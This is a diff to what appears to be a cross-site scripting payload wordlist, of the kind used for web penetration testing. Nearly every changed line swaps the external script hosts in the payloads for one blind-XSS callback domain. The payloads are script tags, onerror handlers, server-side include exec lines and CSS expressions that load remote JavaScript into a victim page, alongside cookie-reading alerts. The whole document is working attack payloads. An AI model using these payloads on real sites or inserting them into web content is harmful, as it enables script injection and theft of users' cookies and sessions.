@@ -66,7 +66,7 @@ alert(document['cookie'])
 "aaa&#x3C;a href=javas&#x26;#99;ript:alert(1)&#x3E;click"
 "><form onformdata=window.confirm(document.cookie)><!--
 a'-alert(1)//
-';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//
+';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://blindprofessor.bxss.in/';s.onreadystatechange = c;document.body.appendChild(s);});//
 ';alert(document.cookie)//
 <svg/onload​=alert/*1337*/(1)>
 <svg/onload​=alert//&NewLine;(2)>
@@ -155,7 +155,7 @@ alert(document['cookie'])
 "aaa&#x3C;a href=javas&#x26;#99;ript:alert(1)&#x3E;click"
 "><form onformdata=window.confirm(document.cookie)><!--
 a'-alert(1)//
-';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//
+';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://blindprofessor.bxss.in/';s.onreadystatechange = c;document.body.appendChild(s);});//
 ';alert(document.cookie)//
 <svg/onload​=alert/*1337*/(1)>
 <svg/onload​=alert//&NewLine;(2)>
@@ -402,7 +402,7 @@ window['alXert'.replace(/X/, '')](self['document']['cookie'])
 ?&q&zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//
 zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//
 <img/src=a onerror="window['alert'](document.cookie)"/>
-<script src=//0-a.nl/conf.js></script>
+<script src=//blindprofessor.bxss.in/></script>
 <iframe src="javascript:alert('XSS')"></iframe>
 <input type="text" value="javascript:alert('XSS')">
 <form action="javascript:alert('XSS')">
@@ -1733,7 +1733,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 <iframe src=""/srcdoc='<svg onload=alert(1)>'>
 <svg><animate onbegin=alert() attributeName=x></svg>
 <img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
-<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
+<img src=1 onerror="s=document.createElement('script');s.src='https://blindprofessor.bxss.in';document.body.appendChild(s);"
 0%0d%0a%00<script src=//h4k.in>
 0%0d%0a%00<script src=//h4k.in>
 0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
@@ -1848,8 +1848,8 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 ";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
 ">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
 ">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
-">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
-">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
+">/XaDoS/><script>alert(document.cookie)</script><script src="https://blindprofessor.bxss.in"></script>
+">/XaDoS/><script>alert(document.cookie)</script><script src="https://blindprofessor.bxss.in"></script>
 "></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 "></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 "></iframe><script>alert(123)</script>
@@ -1956,8 +1956,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
 "><script alert(String.fromCharCode(88,83,83))</script>
 "><script alert(String.fromCharCode(88,83,83))</script>
-"><script src=//brutelogic.com.br&sol;1.js&num;
-"><script src=//brutelogic.com.br&sol;1.js&num;
+"><script src=//blindprofessor.bxss.in&num;
 "><script src=data:&comma;alert(1)//
 "><script src=data:&comma;alert(1)//
 "><script src=https://hackeroneofjaaah.xss.ht></script>
@@ -2204,8 +2203,8 @@ ${alert(1)}
 %20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
 %22%3e%3cscript%3ealert('XSS')%3c/script%3e
 %22%3e%3cscript%3ealert('XSS')%3c/script%3e
-%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
-%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=https://blindprofessor.bxss.in%3E%3C/script%3E%22)’%3E
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=https://blindprofessor.bxss.in%3E%3C/script%3E%22)’%3E
 %22;alert%28%27RVRSH3LL_XSS%29//
 %22;alert%28%27RVRSH3LL_XSS%29//
 %22><svg%20onload=confirm(1);>
@@ -2414,8 +2413,8 @@ ${alert(1)}
 &lt;
 &lt;!&#91;endif&#93;--&gt;
 &lt;!&#91;endif&#93;--&gt;
-&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
-&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
+&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=https://blindprofessor.bxss.in&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
+&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=https://blindprofessor.bxss.in&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
 &lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
 &lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
 &lt;!--&#91;if gte IE 4&#93;&gt;
@@ -2718,52 +2717,48 @@ ${alert(1)}
 &lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
 &lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
-&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
-&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
-&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+&lt;SCRIPT/XSS SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/XSS SRC=\"https://blindprofessor.bxss.in\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/XSS SRC=\"https://blindprofessor.bxss.in\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =\"&gt;\" SRC=\"https://blindprofessor.bxss.in\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =\"&gt;\" SRC=\"https://blindprofessor.bxss.in\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=//blindprofessor.bxss.in&gt;
+&lt;SCRIPT SRC=//blindprofessor.bxss.in&gt;
+&lt;SCRIPT SRC=/blindprofessor.bxss.in&gt;
+&lt;SCRIPT SRC=\"https://blindprofessor.bxss.in\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
-&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
-&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
-&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
-&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=https://blindprofessor.bxss.in&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=https://blindprofessor.bxss.in?&lt;B&gt;
+&lt;SCRIPT SRC=https://blindprofessor.bxss.in
+&lt;SCRIPT SRC=https://blindprofessor.bxss.in
+&lt;SCRIPT SRC=https://blindprofessor.bxss.in&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=https://blindprofessor.bxss.in&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=&quot;https://blindprofessor.bxss.in&quot;&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
 &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
@@ -2936,8 +2931,8 @@ ${alert(1)}
 '<'/'><'s't'y'l'e'/'o'n'l'o'a'd'='a'l'e'r't('1')'>
 '<script>window.onload=function(){document.forms[0].message.value='1';}</script>
 '<script>window.onload=function(){document.forms[0].message.value='1';}</script>
-'>"><script src = 'http://www.site.com/XSS.js'></script>
-'>"><script src = 'http://www.site.com/XSS.js'></script>
+'>"><script src = 'https://blindprofessor.bxss.in'></script>
+'>"><script src = 'https://blindprofessor.bxss.in'></script>
 '>//\\,<'>">">"*"
 '>//\\,<'>">">"*"
 '></select><script>alert(123)</script>
@@ -3112,20 +3107,20 @@ ${alert(1)}
 <!--
 <!--
 <!--
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=https://blindprofessor.bxss.in></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=https://blindprofessor.bxss.in></SCRIPT>'"-->
 <!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
 <!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
 <!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
@@ -3308,8 +3303,8 @@ ${alert(1)}
 </a>//["'`-->]]>]</div>
 </a>//["'`-->]]>]</div>
 </a>//["'`-->]]>]</div>
-</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
-</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='https://blindprofessor.bxss.in')">
+</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='https://blindprofessor.bxss.in')">
 </b>
 </b>
 </body>
@@ -3496,8 +3491,8 @@ ${alert(1)}
     </xsl:stylesheet>
         </xsl:template>
         </xsl:template>
-<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
-<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
+<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=https://blindprofessor.bxss.in>;<;/SCRIPT>;';";-->;
+<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=https://blindprofessor.bxss.in>;<;/SCRIPT>;';";-->;
 <;!--[if gte IE 4]>;           
 <;!--[if gte IE 4]>;           
 <;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
@@ -3642,36 +3637,36 @@ ${alert(1)}
 <;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
 <;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
 <;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
-<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT ";a=';>;';"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT ";a=';>;';"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT/XSS SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT/XSS SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT =";blah"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT =";blah"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
 <;SCRIPT>;a=/XSS/
 <;SCRIPT>;a=/XSS/
 <;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
 <;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
 <;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
 <;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
-<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
 <;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
 <;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
 <;SCRIPT SRC=//ha.ckers.org/.j>;
 <;SCRIPT SRC=//ha.ckers.org/.j>;
-<;SCRIPT SRC=http://ha.ckers.org/xss.js
-<;SCRIPT SRC=http://ha.ckers.org/xss.js
-<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
-<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
-<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;SCRIPT SRC=https://blindprofessor.bxss.in
+<;SCRIPT SRC=https://blindprofessor.bxss.in
+<;SCRIPT SRC=https://blindprofessor.bxss.in>;<;/SCRIPT>;
+<;SCRIPT SRC=https://blindprofessor.bxss.in>;<;/SCRIPT>;
+<;SCRIPT a=";>';>"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT a=";>';>"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT a=";>;"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT a=";>;"; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT a=";blah"; ';'; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT a=";blah"; ';'; SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT a=`>;` SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
+<;SCRIPT a=`>;` SRC=";https://blindprofessor.bxss.in";>;<;/SCRIPT>;
